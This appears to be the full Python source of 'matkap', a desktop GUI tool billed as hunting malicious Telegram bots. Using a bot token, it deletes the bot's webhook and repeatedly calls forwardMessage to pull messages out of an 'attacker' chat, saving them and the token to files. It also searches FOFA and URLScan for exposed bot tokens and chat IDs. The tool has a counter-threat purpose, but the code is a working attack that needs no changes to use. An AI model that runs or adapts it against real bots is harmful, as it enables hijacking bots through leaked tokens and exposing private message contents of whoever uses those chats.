import sys
import json
import os
import threading
import asyncio
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QLineEdit, QTextEdit, QComboBox,
    QMessageBox, QCheckBox, QSpinBox, QDialog, QGridLayout
)
from PySide6.QtGui import QFont, QIcon
from PySide6.QtCore import Qt
from telethon import TelegramClient
import requests
import fofa_api
import urlscan_api

CONFIG_FILE = 'config.json'
TELEGRAM_API_URL = "https://api.telegram.org/bot"

class SettingsDialog(QDialog):
    def __init__(self, config, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Settings")
        self.setFixedWidth(500)
        self.config = config
        layout = QGridLayout()
        self.setLayout(layout)
        self.theme_combo = QComboBox()
        self.theme_combo.addItems(["Dark", "Light"])
        self.theme_combo.setCurrentText(config.get("theme", "Dark"))
        layout.addWidget(QLabel("Theme:"), 0, 0)
        layout.addWidget(self.theme_combo, 0, 1)
        self.font_size_spin = QSpinBox()
        self.font_size_spin.setRange(8, 24)
        self.font_size_spin.setValue(config.get("font_size", 12))
        layout.addWidget(QLabel("Font Size:"), 1, 0)
        layout.addWidget(self.font_size_spin, 1, 1)
        self.max_attempts_spin = QSpinBox()
        self.max_attempts_spin.setRange(10, 10000)
        self.max_attempts_spin.setValue(config.get("max_older_attempts", 300))
        layout.addWidget(QLabel("Max Older Attempts:"), 2, 0)
        layout.addWidget(self.max_attempts_spin, 2, 1)
        self.log_limit_spin = QSpinBox()
        self.log_limit_spin.setRange(100, 100000)
        self.log_limit_spin.setValue(config.get("log_limit", 1000))
        layout.addWidget(QLabel("Log Limit:"), 3, 0)
        layout.addWidget(self.log_limit_spin, 3, 1)
        self.auto_scroll_chk = QCheckBox("Auto Scroll Logs")
        self.auto_scroll_chk.setChecked(config.get("auto_scroll", True))
        layout.addWidget(self.auto_scroll_chk, 4, 0, 1, 2)
        self.telegram_phone = QLineEdit(config.get("telegram_phone", ""))
        layout.addWidget(QLabel("Telegram Phone:"), 5, 0)
        layout.addWidget(self.telegram_phone, 5, 1)
        self.telegram_api_id = QLineEdit(str(config.get("telegram_api_id", "")))
        layout.addWidget(QLabel("Telegram API ID:"), 6, 0)
        layout.addWidget(self.telegram_api_id, 6, 1)
        self.telegram_api_hash = QLineEdit(config.get("telegram_api_hash", ""))
        layout.addWidget(QLabel("Telegram API Hash:"), 7, 0)
        layout.addWidget(self.telegram_api_hash, 7, 1)
        self.fofa_email = QLineEdit(config.get("fofa_email", ""))
        layout.addWidget(QLabel("FOFA Email:"), 8, 0)
        layout.addWidget(self.fofa_email, 8, 1)
        self.fofa_key = QLineEdit(config.get("fofa_key", ""))
        layout.addWidget(QLabel("FOFA Key:"), 9, 0)
        layout.addWidget(self.fofa_key, 9, 1)
        self.urlscan_key = QLineEdit(config.get("urlscan_key", ""))
        layout.addWidget(QLabel("URLScan Key:"), 10, 0)
        layout.addWidget(self.urlscan_key, 10, 1)
        self.save_btn = QPushButton("💾 Save Settings")
        self.save_btn.clicked.connect(self.save_settings)
        self.reset_btn = QPushButton("♻️ Reset to Default")
        self.reset_btn.clicked.connect(self.reset_settings)
        btn_layout = QHBoxLayout()
        btn_layout.addWidget(self.save_btn)
        btn_layout.addWidget(self.reset_btn)
        layout.addLayout(btn_layout, 11, 0, 1, 2)

    def reset_settings(self):
        default_config = {
            "theme":"Dark","font_size":12,"max_older_attempts":300,"log_limit":1000,
            "auto_scroll":True,"telegram_phone":"","telegram_api_id":"",
            "telegram_api_hash":"","fofa_email":"","fofa_key":"","urlscan_key":""
        }
        with open(CONFIG_FILE, 'w') as f:
            json.dump(default_config, f, indent=4)
        QMessageBox.information(self, "Settings", "Settings have been reset.")
        self.accept()

    def save_settings(self):
        self.config.update({
            "theme": self.theme_combo.currentText(),
            "font_size": self.font_size_spin.value(),
            "max_older_attempts": self.max_attempts_spin.value(),
            "log_limit": self.log_limit_spin.value(),
            "auto_scroll": self.auto_scroll_chk.isChecked(),
            "telegram_phone": self.telegram_phone.text(),
            "telegram_api_id": self.telegram_api_id.text(),
            "telegram_api_hash": self.telegram_api_hash.text(),
            "fofa_email": self.fofa_email.text(),
            "fofa_key": self.fofa_key.text(),
            "urlscan_key": self.urlscan_key.text()
        })
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.config, f, indent=4)
        self.accept()

class matkap(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("matkap")
        self.setWindowIcon(QIcon("logo.png"))
        self.setGeometry(200, 200, 1400, 800)
        self.load_config()
        self.bot_token = None
        self.bot_username = None
        self.my_chat_id = None
        self.last_message_id = None
        self.stop_flag = False
        self.stopped_id = 0
        self.session = requests.Session()
        self.setup_ui()
        self.apply_theme(self.config.get('theme', 'Dark'))

    def load_config(self):
        default_config = {
            "theme":"Dark","font_size":12,"max_older_attempts":300,"log_limit":1000,
            "auto_scroll":True,"telegram_phone":"","telegram_api_id":"",
            "telegram_api_hash":"","fofa_email":"","fofa_key":"","urlscan_key":""
        }
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                self.config = json.load(f)
        else:
            self.config = default_config
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self.config, f, indent=4)

    def setup_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout()
        central.setLayout(main_layout)
        header = QLabel("matkap | Hunt Down Malicious Telegram Bots")
        header.setFont(QFont("Arial", 20, QFont.Bold))
        header.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(header)
        form = QHBoxLayout()
        self.token_input = QLineEdit()
        self.token_input.setPlaceholderText("Bot Token")
        form.addWidget(self.token_input)
        self.chat_id_input = QLineEdit()
        self.chat_id_input.setPlaceholderText("Chat ID")
        form.addWidget(self.chat_id_input)
        self.infiltrate_btn = QPushButton("1) Start Attack")
        self.infiltrate_btn.clicked.connect(lambda: threading.Thread(target=self._start_infiltration, daemon=True).start())
        form.addWidget(self.infiltrate_btn)
        self.forward_btn = QPushButton("2) Forward All")
        self.forward_btn.clicked.connect(lambda: threading.Thread(
            target=self.forward_continuation,
            args=(self.chat_id_input.text().strip(), 1),
            daemon=True
        ).start())
        form.addWidget(self.forward_btn)
        self.stop_btn = QPushButton("⛔ Stop")
        self.stop_btn.clicked.connect(self.stop_forwarding)
        form.addWidget(self.stop_btn)
        self.resume_btn = QPushButton("▶️ Resume")
        self.resume_btn.clicked.connect(lambda: threading.Thread(
            target=self.forward_continuation,
            args=(self.chat_id_input.text().strip(), self.stopped_id + 1),
            daemon=True
        ).start())
        form.addWidget(self.resume_btn)
        self.fofa_btn = QPushButton("Hunt FOFA")
        self.fofa_btn.clicked.connect(lambda: threading.Thread(target=self._fofa_hunt_process, daemon=True).start())
        form.addWidget(self.fofa_btn)
        self.urlscan_btn = QPushButton("Hunt URLScan")
        self.urlscan_btn.clicked.connect(lambda: threading.Thread(target=self._urlscan_hunt_process, daemon=True).start())
        form.addWidget(self.urlscan_btn)
        self.settings_btn = QPushButton("⚙️ Settings")
        self.settings_btn.clicked.connect(self.open_settings_dialog)
        form.addWidget(self.settings_btn)
        main_layout.addLayout(form)
        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        main_layout.addWidget(self.log_area)
        log_ctrl = QHBoxLayout()
        self.clear_btn = QPushButton("Clear Logs")
        self.clear_btn.clicked.connect(self.clear_logs)
        log_ctrl.addWidget(self.clear_btn)
        self.export_btn = QPushButton("Export Logs")
        self.export_btn.clicked.connect(self.export_logs)
        log_ctrl.addWidget(self.export_btn)
        main_layout.addLayout(log_ctrl)

    def apply_theme(self, theme):
        if theme == 'Dark':
            sheet = """
                QWidget { background-color: #1e1e1e; color: #fff; }
                QLineEdit, QTextEdit { background-color: #2d2d2d; }
                QPushButton { background-color: #444; }
            """
        else:
            sheet = """
                QWidget { background-color: #fff; color: #000; }
                QLineEdit, QTextEdit { background-color: #f2f2f2; }
                QPushButton { background-color: #e1e1e1; }
            """
        self.setStyleSheet(sheet)

    def log(self, msg):
        self.log_area.append(msg)
        if self.config.get('auto_scroll', True):
            sb = self.log_area.verticalScrollBar()
            sb.setValue(sb.maximum())

    def open_settings_dialog(self):
        dlg = SettingsDialog(self.config, self)
        if dlg.exec():
            self.load_config()
            self.apply_theme(self.config.get('theme', 'Dark'))

    def parse_bot_token(self, raw):
        return raw[3:] if raw.lower().startswith('bot') else raw

    def get_me(self, token):
        try:
            d = requests.get(f"{TELEGRAM_API_URL}{token}/getWebhookInfo").json()
            if d.get('ok') and d['result'].get('url'):
                requests.get(f"{TELEGRAM_API_URL}{token}/deleteWebhook")
            info = requests.get(f"{TELEGRAM_API_URL}{token}/getMe").json()
            if info.get('ok'):
                return info['result']
            else:
                self.log(f"[getMe] Error: {info}")
                return None
        except Exception as e:
            self.log(f"[getMe] Req error: {e}")
            return None

    async def telethon_send_start(self, bot_username):
        try:
            client = TelegramClient(
                'anon_session',
                int(self.config['telegram_api_id']),
                self.config['telegram_api_hash'],
                app_version='9.4.0'
            )
            await client.start(self.config['telegram_phone'])
            self.log("✅ [Telethon] Logged in with your account.")
            if not bot_username.startswith("@"):
                bot_username = "@" + bot_username
            await client.send_message(bot_username, "/start")
            self.log(f"✅ [Telethon] '/start' sent to {bot_username}.")
            await asyncio.sleep(2)
        except Exception as e:
            self.log(f"❌ [Telethon] Send error: {e}")

    def get_updates(self, token):
        try:
            d = requests.get(f"{TELEGRAM_API_URL}{token}/getUpdates").json()
            if d.get('ok') and d['result']:
                last = d['result'][-1]['message']
                return last['chat']['id'], last['message_id']
        except Exception as e:
            self.log(f"[getUpdates] error: {e}")
        return None, None

    def _start_infiltration(self):
        raw = self.token_input.text().strip()
        if not raw:
            self.log("Error: Bot Token required!")
            return
        token = self.parse_bot_token(raw)
        info = self.get_me(token)
        if not info:
            self.log("Error: Invalid bot token")
            return
        bot_user = info.get('username')
        self.log(f"[getMe] Bot validated: @{bot_user}")
        self.bot_token = token
        self.bot_username = bot_user
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.telethon_send_start(bot_user))
        my_id, last_id = self.get_updates(token)
        if not my_id or not last_id:
            self.log("Error: getUpdates failed")
            return
        self.my_chat_id, self.last_message_id = my_id, last_id
        self.log(f"[Infiltration] Chat={my_id}, LastMsg={last_id}")
        attacker = self.chat_id_input.text().strip()
        if attacker:
            self.stop_flag = False
            self.infiltration_process(attacker)

    def infiltration_process(self, attacker_id):
        start = self.last_message_id or 0
        stop = max(1, start - self.config.get('max_older_attempts', 300))
        self.log(f"Trying older IDs from {start} down to {stop}")
        for mid in range(start, stop - 1, -1):
            if self.stop_flag:
                self.log("⏹️ Infiltration stopped by user.")
                return
            if self.forward_msg(self.bot_token, attacker_id, self.my_chat_id, mid):
                self.log(f"✅ Captured older message ID {mid}")
                break
            else:
                self.log(f"Try next older ID {mid - 1}...")
        self.log("📝 Older ID check complete.")

    def forward_msg(self, token, from_id, to_id, msg_id):
        try:
            r = self.session.post(
                f"{TELEGRAM_API_URL}{token}/forwardMessage",
                json={"from_chat_id": from_id, "chat_id": to_id, "message_id": msg_id}
            ).json()
            if r.get('ok'):
                self.log(f"✅ Forwarded message ID {msg_id}.")
                threading.Thread(
                    target=self.async_save_message_to_file,
                    args=(token, from_id, msg_id),
                    daemon=True
                ).start()
                return True
            else:
                self.log(f"⚠️ Forward fail ID {msg_id}, reason: {r}")
        except Exception as e:
            self.log(f"❌ Forward error ID {msg_id}: {e}")
        return False

    def forward_continuation(self, attacker_id, start_id):
        success_count = 0
        for mid in range(start_id, self.last_message_id + 1):
            if self.stop_flag:
                self.stopped_id = mid
                self.log(f"⏹️ Stopped at ID {mid}")
                return
            if self.forward_msg(self.bot_token, attacker_id, self.my_chat_id, mid):
                success_count += 1
        self.log(f"📤 Forwarded {success_count} messages.")

    def stop_forwarding(self):
        self.stop_flag = True
        self.log("➡️ Stop request sent.")

    def resume_forward(self):
        self.log(f"▶️ Resuming from ID {self.stopped_id + 1}")
        self.stop_flag = False
        threading.Thread(
            target=self.forward_continuation,
            args=(self.chat_id_input.text().strip(), self.stopped_id + 1),
            daemon=True
        ).start()

    def save_message_to_file(self, chat_id, content):
        os.makedirs('captured_messages', exist_ok=True)
        safe = self.bot_token.split(':')[0] if self.bot_token else 'unknown'
        filename = os.path.join('captured_messages', f'bot_{safe}_chat_{chat_id}_data.txt')
        header = not os.path.exists(filename)
        try:
            with open(filename, 'a', encoding='utf-8') as f:
                if header:
                    f.write("=== Bot Information ===\n")
                    f.write(f"Bot Token: {self.bot_token}\n")
                    f.write(f"Bot Username: @{self.bot_username}\n")
                    f.write(f"Chat ID: {chat_id}\n")
                    f.write(f"Last Message ID: {self.last_message_id}\n\n")
                f.write(f"--- Message ID: {content['message_id']} ---\n")
                f.write(f"Date: {content['date']}\n")
                if content['text']:
                    f.write(f"Text: {content['text']}\n")
                if content['caption']:
                    f.write(f"Caption: {content['caption']}\n")
                if content['file_id']:
                    f.write(f"File ID: {content['file_id']}\n")
                f.write("----------------------------------------\n")
            return True
        except Exception as e:
            self.log(f"❌ Save to file error: {e}")
            return False

    def get_message_content(self, token, chat_id, msg_id):
        try:
            r = self.session.post(
                f"{TELEGRAM_API_URL}{token}/forwardMessage",
                json={"chat_id": self.my_chat_id, "from_chat_id": chat_id, "message_id": msg_id}
            )
            msg = r.json().get('result', {})
            return {
                'message_id': msg_id,
                'date': msg.get('date'),
                'text': msg.get('text', ''),
                'caption': msg.get('caption', ''),
                'file_id': (msg.get('photo') or msg.get('document') or None)
            }
        except Exception as e:
            self.log(f"❌ Get message content error ID {msg_id}: {e}")
            return None

    def async_save_message_to_file(self, token, chat_id, msg_id):
        content = self.get_message_content(token, chat_id, msg_id)
        if content and self.save_message_to_file(chat_id, content):
            self.log(f"📝 [Async] Saved message ID {msg_id}.")
        else:
            self.log(f"⚠️ [Async] Failed to save message ID {msg_id}.")

    def run_fofa_hunt(self):
        threading.Thread(target=self._fofa_hunt_process, daemon=True).start()

    def _fofa_hunt_process(self):
        self.log("🔎 Starting FOFA hunt for body='api.telegram.org' ...")
        results = fofa_api.search_fofa_and_hunt()
        if not results:
            self.log("🚫 FOFA API Error or no results")
            self.log("📝 FOFA hunt finished.")
            return
        for site, toks, chats in results:
            if site.startswith(("Error", "FOFA")):
                self.log(f"🚫 {site}")
                continue
            if site.startswith("No results"):
                self.log("⚠️ No FOFA results found.")
                continue
            self.log(f"✨ Found: {site}")
            if toks:
                self.log("   🪄 Tokens: " + ", ".join(toks))
            if chats:
                self.log("   Potential Chat IDs: " + ", ".join(chats))
        self.log("📝 FOFA hunt finished.")

    def run_urlscan_hunt(self):
        threading.Thread(target=self._urlscan_hunt_process, daemon=True).start()

    def _urlscan_hunt_process(self):
        self.log("🔎 Starting URLScan hunt for domain:api.telegram.org ...")
        results = urlscan_api.search_urlscan_and_hunt()
        if not results:
            self.log("⚠️ No URLScan results found.")
            self.log("📝 URLScan hunt finished.")
            return
        for site, toks, chats in results:
            if site.startswith("Error"):
                self.log(f"🚫 {site}")
                continue
            if site.startswith("No results"):
                self.log("⚠️ No URLScan results found.")
                continue
            self.log(f"✨ Found: {site}")
            if toks:
                self.log("   🪄 Tokens: " + ", ".join(toks))
            if chats:
                self.log("   Potential Chat IDs: " + ", ".join(chats))
        self.log("📝 URLScan hunt finished.")

    def clear_logs(self):
        self.log_area.clear()

    def export_logs(self):
        try:
            with open('logs.txt', 'w', encoding='utf-8') as f:
                f.write(self.log_area.toPlainText())
            QMessageBox.information(self, 'Export Logs', "Logs have been exported to 'logs.txt'.")
        except Exception as e:
            QMessageBox.critical(self, 'Error', str(e))

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = matkap()
    window.show()
    sys.exit(app.exec())
